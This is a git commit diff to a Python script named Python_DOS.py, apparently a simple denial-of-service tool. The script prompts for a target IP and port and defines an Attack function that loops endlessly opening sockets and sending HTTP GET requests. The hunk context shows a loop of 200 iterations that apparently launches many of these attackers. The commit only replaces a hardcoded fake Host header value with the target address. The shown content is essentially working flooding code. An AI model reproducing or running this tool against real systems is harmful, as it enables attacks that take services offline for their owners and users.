cfdd0c433f1112c475a6c5df2dbe48b2998aabca
5odead <71369187+5odead@users.noreply.github.com>
2026-05-31 12:13:09 +0530

    Update Python_DOS.py

--- Python_DOS.py
+++ Python_DOS.py
@@ -8,13 +8,11 @@ import socket
 Target = input("Enter Target IP: ")
 Port = int(input("Enter Target Port Number: "))
 
-Fake_IP = "188.22.23.34"
-
 def Attack():
         while True:
                 S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 S.connect((Target, Port))
-                S.send(("GET / HTTP/1.1\r\nHost: " + Fake_IP + "\r\n\r\n").encode('ascii'))
+                S.send(("GET / HTTP/1.1\r\nHost: " + Target + "\r\n\r\n").encode('ascii'))
                 S.close()
 
 for i in range(200):
